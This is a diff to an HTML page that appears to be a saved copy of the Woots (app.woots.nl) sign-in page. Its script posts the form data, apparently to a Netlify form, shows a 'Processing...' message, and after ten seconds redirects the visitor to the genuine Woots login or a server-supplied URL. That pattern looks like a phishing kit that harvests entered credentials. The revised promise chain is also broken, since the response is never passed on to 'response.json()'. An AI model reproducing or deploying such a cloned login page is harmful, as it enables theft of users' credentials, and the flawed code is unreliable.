@@ -110,7 +110,8 @@
   <p>Processing...</p>
 </div>
     </div>
-<script>function submitForm() {
+<script>
+function submitForm() {
   const form = document.getElementById('myForm');
   const formData = new FormData(form);
 
@@ -120,20 +121,32 @@
     body: formData,
   })
   .then(() => {
-    // Show a loading message for 10 seconds
+    // Show a loading message while waiting for Netlify response
     document.getElementById('loading').style.display = 'block';
+    document.getElementById('loading').textContent = 'Processing...';
+  })
+  .then((response) => response.json())
+  .then((data) => {
+    // Proceed after Netlify response
+    if (data.success) {
+      // Netlify form submitted successfully
+      document.getElementById('loading').textContent = 'Form submitted! Redirecting...';
 
-    setTimeout(() => {
-      document.getElementById('loading').style.display = 'none';
-      // Redirect user after 10 seconds
-      window.location.href = 'https://app.woots.nl/users/sign_in';
-    }, 10000);
+      // Start the 10-second delay before redirect
+      setTimeout(() => {
+        window.location.href = data.redirectUrl;
+      }, 10000);
+    } else {
+      // Handle Netlify form submission error
+      alert('Error submitting form: ' + data.error);
+    }
   })
   .catch((error) => {
     // Handle errors
     alert('Error submitting form: ' + error);
   });
-}</script>
+}
+</script>
     <img alt="nice to see you" style="max-height:250px" class="mt-6 responsive lazy entered loaded" data-src="https://assets.ans.app/assets/woots/nice_to_see_you-bfc5b4c9b22615a892cc43e3f403423854ded27c.png" src="./index_files/nice_to_see_you-bfc5b4c9b22615a892cc43e3f403423854ded27c.png" data-ll-status="loaded">
     
 <!--     <!DOCTYPE html>
